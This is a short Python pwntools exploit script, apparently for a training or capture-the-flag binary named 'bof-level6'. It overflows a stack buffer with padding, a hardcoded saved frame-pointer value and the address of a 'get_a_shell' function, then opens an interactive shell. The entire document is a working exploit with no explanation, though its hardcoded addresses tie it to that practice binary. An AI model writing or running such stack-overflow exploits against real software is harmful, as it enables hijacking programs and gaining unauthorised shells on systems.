#!/usr/bin/env python
from pwn import *

#p = process('./bof-levelx')
p = process('./bof-level6')

target_ebp_value = p64(0x7fffffffe2c0)
addr_of_get_a_shell = p64(0x000000000040063a)
buf = "A" * 0x80 + target_ebp_value
buf = 'AAAAAAAA' + addr_of_get_a_shell + 'A' * (0x80 - 16) + target_ebp_value


p.sendline(buf)

# enjoy!
p.interactive()

